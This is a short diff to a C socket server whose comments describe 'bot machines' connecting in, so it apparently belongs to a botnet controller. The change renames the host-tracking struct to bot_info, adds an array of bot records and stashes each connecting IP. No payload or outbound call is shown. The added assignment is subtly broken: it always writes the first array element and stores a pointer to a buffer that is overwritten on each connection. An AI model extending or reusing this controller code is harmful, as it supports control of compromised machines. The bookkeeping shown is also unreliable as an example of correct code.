@@ -13,11 +13,10 @@
 
 #define PORT "3490" // The port the bot machines will connect to
 
-#define BACKLOG 100 // The max number of machines (100 should be plenty)
+#define BACKLOG 100 // Max number of connections
 
-struct host_information {
-	struct in_addr ip;
-	char* whois_org;
+struct bot_info {
+	char* ip;
 	char* system_name;
 	char* os_ver;
 };
@@ -150,6 +149,7 @@ int server_loop() {
 	int yes = 1;
 	char s[INET_ADDRSTRLEN];
 	int rv;
+	struct bot_info botstat[BACKLOG];
 	
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_UNSPEC;
@@ -213,6 +213,7 @@ int server_loop() {
 
 		inet_ntop(bot_addr.ss_family, get_in_addr((struct sockaddr *)&bot_addr), s, sizeof s);
 		printf("server: got connection from %s\n", s);
+		botstat->ip = s; // Stash the IP address to be stored later
 
 		if (!fork()) {
 			close(sockfd);
